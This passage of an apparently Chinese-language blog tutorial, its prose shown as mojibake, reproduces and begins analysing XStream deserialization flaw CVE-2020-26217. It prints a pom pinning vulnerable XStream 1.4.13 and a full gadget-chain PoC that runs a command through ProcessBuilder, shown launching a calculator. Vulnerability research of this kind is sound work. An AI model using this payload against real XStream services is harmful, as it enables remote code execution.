class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>ç¯å¢ƒæ­å»º</p></blockquote><p>idea æ–°å»ºé¡¹ç›®</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230816144345229-16921688486111.png" data-caption="image-20230816144345229"><img src="/../images/Java/deserialization/image-20230816144345229-16921688486111.png" alt="image-20230816144345229"></a></p><p>é…ç½® <code>pom.xml</code> å¼•å…¥ <code>xstream</code> æ¼æ´ç‰ˆæœ¬ä¾èµ–,å¼•å…¥åé‡æ–° maven åŠ è½½é¡¹ç›®ï¼Œ<code>åœ¨ pom.xmlå¤„å³é”®-&gt; maven-&gt; Reload project</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230816162251164.png" data-caption="image-20230816162251164"><img src="/../images/Java/deserialization/image-20230816162251164.png" alt="image-20230816162251164"></a></p><p><code>pom.xml</code> æ–‡ä»¶å¦‚ä¸‹</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream-2020-26217<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--å¼•å…¥ XStream 1.4.15 ä¾èµ–--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.thoughtworks.xstream<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.13<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>xstream-2020-26217<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>maven æ‹‰å– xstream æˆåŠŸåï¼Œå…ˆåœ¨ java ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª java.class éªŒè¯ xstream æ˜¯å¦å¯ç”¨ï¼Œå¦‚ä¸‹ï¼š</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230816152445246.png" data-caption="image-20230816152445246"><img src="/../images/Java/deserialization/image-20230816152445246.png" alt="image-20230816152445246"></a></p><p>ç„¶ååˆ©ç”¨è¯¥ä»£ç è¿›è¡Œæ¼æ´è°ƒè¯•ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230816154712837.png" data-caption="image-20230816154712837"><img src="/../images/Java/deserialization/image-20230816154712837.png" alt="image-20230816154712837"></a></p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XStreamExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="comment">// å®šä¹‰ä¸€ä¸ªXMLå­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;map&gt;poc&lt;/map&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºXStreamå¯¹è±¡</span></span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å°†XMLå­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸ºå¯¹è±¡</span></span><br><span class="line">        xstream.fromXML(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å…¶ä¸­ <code>String xml</code> å†…å®¹æ›¿æ¢ä¸ºä¸Šæ–‡æåŠçš„å®˜æ–¹ <code>poc</code> ï¼Œ å…¶ä¸­ <code>&lt;command&gt; &lt;/command&gt;</code> æ ‡ç­¾å¡«å…¥éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œç¬”è€…ä½¿ç”¨çš„æ˜¯ <code>Ubuntu</code> ï¼Œå¼¹å‡ºè®¡ç®—å™¨çš„å‘½ä»¤ä¸º <code>gnome-calculator</code> ,å®Œæ•´ä»£ç å¦‚ä¸‹</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230816155321191.png" data-caption="image-20230816155321191"><img src="/../images/Java/deserialization/image-20230816155321191.png" alt="image-20230816155321191"></a></p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">import com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line">public class XStreamExample &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        // å®šä¹‰ä¸€ä¸ªXMLå­—ç¬¦ä¸²</span><br><span class="line">        String xml = &quot;<span class="tag">&lt;<span class="name">map</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;  <span class="tag">&lt;<span class="name">entry</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;      <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;      <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;        <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;          <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;            <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;            <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;              <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.spi.FilterIterator&#x27;</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                  <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.ArrayList$Itr&#x27;</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                    <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                    <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                    <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                    <span class="tag">&lt;<span class="name">outer-class</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                      <span class="tag">&lt;<span class="name">java.lang.ProcessBuilder</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                        <span class="tag">&lt;<span class="name">command</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>gnome-calculator\n<span class="tag">&lt;/<span class="name">string</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                        <span class="tag">&lt;/<span class="name">command</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                      <span class="tag">&lt;/<span class="name">java.lang.ProcessBuilder</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                    <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                  <span class="tag">&lt;/<span class="name">iter</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                  <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                    <span class="tag">&lt;<span class="name">method</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                      <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                      <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                      <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                    <span class="tag">&lt;/<span class="name">method</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                    <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                  <span class="tag">&lt;<span class="name">next</span>/&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;              <span class="tag">&lt;/<span class="name">e</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;              <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;              <span class="tag">&lt;/<span class="name">in</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;            <span class="tag">&lt;/<span class="name">is</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;            <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;          <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;          <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span>\n&quot; +</span><br><span class="line">                &quot;        <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;        <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;      <span class="tag">&lt;/<span class="name">value</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;    <span class="tag">&lt;<span class="name">string</span>&gt;</span>test<span class="tag">&lt;/<span class="name">string</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;<span class="tag">&lt;/<span class="name">map</span>&gt;</span>&quot;;</span><br><span class="line"></span><br><span class="line">        // åˆ›å»ºXStreamå¯¹è±¡</span><br><span class="line">        XStream xstream = new XStream();</span><br><span class="line"></span><br><span class="line">        // å°†XMLå­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸ºå¯¹è±¡</span><br><span class="line">        xstream.fromXML(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>æ‰§è¡Œåï¼Œå¼¹å‡ºè®¡ç®—å™¨</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230816155458123.png" data-caption="image-20230816155458123"><img src="/../images/Java/deserialization/image-20230816155458123.png" alt="image-20230816155458123"></a></p><p>äº¦å¯æ‰§è¡Œå…¶ä»–å‘½ä»¤ï¼Œå¦‚ä¸‹ï¼Œåˆ›å»ºä¸€ä¸ª <code>test.txt</code> æ–‡ä»¶</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230816155658396.png" data-caption="image-20230816155658396"><img src="/../images/Java/deserialization/image-20230816155658396.png" alt="image-20230816155658396"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230816155805410.png" data-caption="image-20230816155805410"><img src="/../images/Java/deserialization/image-20230816155805410.png" alt="image-20230816155805410"></a></p><blockquote><p>æ¼æ´åˆ†æ</p></blockquote><p>å…ˆå¯¹è¯¥ Poc è¿›è¡Œåˆ†æï¼Œäº†è§£å…¶æ„é€ è¿‡ç¨‹ï¼Œæ–¹ä¾¿ä¸‹é¢çš„è°ƒè¯•ã€‚å›åˆ° Poc åˆ†æå…¶ Poc ä»£ç å«ä¹‰ï¼Œæ–°å»º poc.xml å†…å®¹ä¸ºæ¼æ´ Pocï¼Œç„¶ååˆ©ç”¨ <code>firefox</code> æ‰“å¼€ poc.xml ,ç„¶åå°† Poc æŠ˜å ï¼Œå¾—åˆ°å¦‚ä¸‹å›¾ï¼Œç¬¬ä¸€å±‚å…ƒç´ ä¸º <code>&lt;map&gt;&lt;/map&gt;</code> , ç¬¬äºŒå±‚å…ƒç´ ä¸º <code>&lt;entry&gt;&lt;/entry&gt;</code> è¿™ä¸¤å±‚ä¸‹å¸¦æœ‰ä¸¤ä¸ªå…ƒç´  <code>jdk.nashorn.internal.objects.NativeString</code> å’Œ <code>string</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818155012194.png" data-caption="image-20230818155012194"><img src="/../images/Java/deserialization/image-20230818155012194.png" alt="image-20230818155012194"></a></p><p>åˆ©ç”¨å¦‚ä¸‹ä»£ç ï¼Œæ„å»ºä¸€ä¸ªæ¡ˆä¾‹ï¼Œå¯æ¸…æ™°äº†è§£åˆ°å…¶ä½œç”¨</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¯¼å…¥ XStream ç±»</span></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"><span class="comment">// å¯¼å…¥HashMapç±»</span></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="comment">// å¯¼å…¥Mapç±»</span></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰ä¸€ä¸ªåä¸ºPersonçš„è‡ªå®šä¹‰ç±»</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="comment">// è®¾ç½®å±æ€§</span></span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Person ç±»çš„æ„é€ å‡½æ•°ï¼Œæ¥å—å§“åå’Œå¹´é¾„å‚æ•°</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="comment">// å°†ä¼ å…¥çš„å§“åèµ‹å€¼ç»™nameå±æ€§</span></span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="comment">// å°†ä¼ å…¥çš„å¹´é¾„èµ‹å€¼ç»™ageå±æ€§</span></span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰ä¸€ä¸ª MapTest ç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MapTest</span> &#123;</span><br><span class="line"><span class="comment">// ä¸»æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// åˆ›å»ºä¸€ä¸ªHashMapå¯¹è±¡ï¼Œå‘½åä¸ºmap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">// å°†ä¸€ä¸ªPersonå¯¹è±¡ä½œä¸ºé”®ï¼Œå­—ç¬¦ä¸²&quot;test&quot;ä½œä¸ºå€¼ï¼Œæ·»åŠ åˆ°mapä¸­</span></span><br><span class="line">        map.put(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John&quot;</span>, <span class="number">18</span>), <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºä¸€ä¸ªXStreamå¯¹è±¡ï¼Œç”¨äºå°†å¯¹è±¡è½¬æ¢ä¸ºXML</span></span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="comment">// å°†mapå¯¹è±¡è½¬æ¢ä¸ºXMLå­—ç¬¦ä¸²ï¼Œå¹¶å°†ç»“æœèµ‹å€¼ç»™xmlå˜é‡</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> xstream.toXML(map);</span><br><span class="line">        <span class="comment">// æ‰“å°XMLå­—ç¬¦ä¸²åˆ°æ§åˆ¶å°</span></span><br><span class="line">        System.out.println(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>è¿è¡Œåç»“æœå¦‚ä¸‹ï¼š</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818162034463.png" data-caption="image-20230818162034463"><img src="/../images/Java/deserialization/image-20230818162034463.png" alt="image-20230818162034463"></a></p><p>ç”±ä»£ç å¯çŸ¥ï¼Œ<code>map</code> ä½œä¸º <code>HashMap()</code> çš„å¯¹è±¡ï¼Œç„¶åå°† <code>Person</code> çš„é”® <code>(&quot;John&quot;, 18)</code>ã€é”®å€¼ <code>(&quot;test&quot;)</code> åŠ è½½åˆ° <code>map</code> ä¸­ï¼Œç„¶ååˆ©ç”¨ <code>xstream.toXML()</code> åºåˆ—åŒ–ä¸º <code>xml</code> æ ¼å¼</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818161935225.png" data-caption="image-20230818161935225"><img src="/../images/Java/deserialization/image-20230818161935225.png" alt="image-20230818161935225"></a></p><p>é€šè¿‡ä¸Šé¢åˆ†æå¯çŸ¥ï¼Œè‹¥åˆ©ç”¨ XStream è¿›è¡Œåºåˆ—åŒ–ä¼šåˆ©ç”¨ HashMap() è¿›è€Œç”Ÿæˆå¦‚ä¸‹æ ¼å¼ï¼š</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mapå¯¹è±¡å</span>&gt;</span>é”®<span class="tag">&lt;/<span class="name">mapå¯¹è±¡å</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>å€¼<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>å°† Poc å†å±•å¼€ä¸€å±‚ï¼Œé€šè¿‡ä¸Šé¢åˆ†æå¯çŸ¥ï¼Œæ•´ä¸ª Poc å¯ä»¥çœ‹ä½œä¸ºä¸€ä¸ª map é›†åˆï¼Œç„¶å map é›†åˆä¸‹é¢æœ‰è®¸å¤šå…ƒç´ ï¼Œå…¶ä¸­ <code>jdk.nashorn.internal.objects.NativeString</code> ä¸º <code>HashMap()</code> çš„å¯¹è±¡ï¼Œ <code>jdk.nashorn.internal.objects.NativeString</code> åˆå¸¦æœ‰ <code>&lt;flag&gt;</code> å’Œ <code>&lt;value&gt;</code> å±æ€§ï¼Œå…¶å€¼åˆ†åˆ«ä¸º <code>0</code>ã€<code>com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</code> </p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818162426050.png" data-caption="image-20230818162426050"><img src="/../images/Java/deserialization/image-20230818162426050.png" alt="image-20230818162426050"></a></p><p>å†å±•å¼€ value å€¼åå¾—åˆ°æ›´å¤šå…·ä½“çš„å…ƒç´ ï¼Œè¿™æ ·åœ¨è°ƒè¯•ä»£ç æ—¶å¯ä»¥æ¸…æ™°åœ°çŸ¥é“è¯¥è¿½è¸ªå“ªäº›ä»£ç è¿›è¡Œåˆ†æ</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818163930547.png" data-caption="image-20230818163930547"><img src="/../images/Java/deserialization/image-20230818163930547.png" alt="image-20230818163930547"></a></p><p>é€šè¿‡ä¸Šé¢åˆ†æå¯çŸ¥ï¼ŒXStream åœ¨è¿›è¡Œåºåˆ—åŒ–å‰ï¼Œ(è¯¥Pocä¸ºä¾‹) éœ€å…ˆå°† 